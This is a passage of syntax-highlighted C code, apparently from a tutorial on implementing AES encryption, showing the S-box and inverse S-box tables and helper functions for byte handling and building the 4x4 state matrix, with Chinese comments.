class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>                               <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>                               <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>                               <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>                               <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>                               <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>                               <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>                               <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>                               <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>                               <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>                               <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>                               <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>                               <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆S盒</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S2[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>                                <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>                                <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>                                <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>                                <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>                                <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>                                <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>                                <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>                                <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>                                <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>                                <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>                                <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>                                <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>                                <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>                                <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>                                <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span> &#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S3[] = &#123; <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>                                <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>                                <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>                                <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>                                <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>                                <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>                                <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>                                <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>                                <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>                                <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>                                <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>                                <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>                                <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>                                <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>                                <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>                                <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span> &#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取整形数据的低8位的左4个位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getLeft4Bit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = num &amp; <span class="hljs-number">0x000000f0</span>;<br>    <span class="hljs-keyword">return</span> left &gt;&gt; <span class="hljs-number">4</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取整形数据的低8位的右4个位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getRight4Bit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> num &amp; <span class="hljs-number">0x0000000f</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据索引，从S盒中获得元素</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumFromSBox</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = getLeft4Bit(index);<br>    <span class="hljs-keyword">int</span> col = getRight4Bit(index);<br>    <span class="hljs-keyword">return</span> S[row][col];<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把一个字符转变成整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getIntFromChar</span><span class="hljs-params">(<span class="hljs-keyword">char</span> c)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result = (<span class="hljs-keyword">int</span>) c;<br>    <span class="hljs-keyword">return</span> result &amp; <span class="hljs-number">0x000000ff</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把16个字符转变成4X4的数组，</span><br><span class="hljs-comment"> * 该矩阵中字节的排列顺序为从上到下，</span><br><span class="hljs-comment"> * 从左到右依次排列。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">convertToIntArray</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> pa[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> * pp = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)str;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            pa[j][i] = getIntFromChar(str[k]);<br>            k++;<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印4X4的数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>,  a[i][j]);<br>        <span class="hljs-built_in">printf</span>(<span 